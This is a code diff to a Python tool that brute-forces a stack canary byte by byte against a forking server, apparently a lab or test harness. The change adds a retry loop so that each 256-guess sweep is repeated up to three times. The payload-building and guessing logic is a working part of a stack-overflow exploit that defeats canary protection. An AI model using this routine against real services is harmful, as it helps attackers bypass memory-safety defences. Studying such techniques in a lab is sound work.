@@ -10,6 +10,7 @@ _CANARY_SIZE = 8
 _ATTEMPT_RECV_TIMEOUT = 0.15
 _SMASH_MARKER = b"stack smashing"
 _DEFAULT_SEARCH_MAX = 512
+_MAX_POSITION_ATTEMPTS = 3
 
 
 class CanaryNotFoundError(Exception):
@@ -48,19 +49,29 @@ def crack_canary(server: ForkingServer, search_max: int = _DEFAULT_SEARCH_MAX) -
     offset = _find_canary_offset(server, search_max)
     canary = bytearray()
     for position in range(_CANARY_SIZE):
-        found = None
+        canary.append(_find_byte_at_position(server, offset, canary, position))
+    return CanaryResult(offset=offset, canary=bytes(canary))
+
+
+def _find_byte_at_position(server: ForkingServer, offset: int, canary: bytearray, position: int) -> int:
+    # Retries the *whole* 256-guess sweep, not individual guesses — a
+    # transient miss on the one guess that shouldn't smash (see
+    # _smashes()'s own stale-message-drain comment) makes every guess in
+    # that sweep look like a smash, so "no working byte found" isn't
+    # necessarily a real failure. Confirmed rare-but-real on fast native
+    # hardware even after the drain-before-send fix: one full run got
+    # every byte right except the very last, on a second crack against
+    # the same server. A repeat of the same transient condition landing
+    # on the exact same guess again is unlikely.
+    for _ in range(_MAX_POSITION_ATTEMPTS):
         for guess in range(256):
             payload = b"A" * offset + bytes(canary) + bytes([guess])
             if not _smashes(server, payload):
-                found = guess
-                break
-        if found is None:
-            raise CanaryNotFoundError(
-                f"no working byte found at canary position {position} "
-                f"(cracked so far: {bytes(canary).hex()})"
-            )
-        canary.append(found)
-    return CanaryResult(offset=offset, canary=bytes(canary))
+                return guess
+    raise CanaryNotFoundError(
+        f"no working byte found at canary position {position} "
+        f"(cracked so far: {bytes(canary).hex()}) after {_MAX_POSITION_ATTEMPTS} attempts"
+    )
 
 
 def _find_canary_offset(server: ForkingServer, search_max: int) -> int:
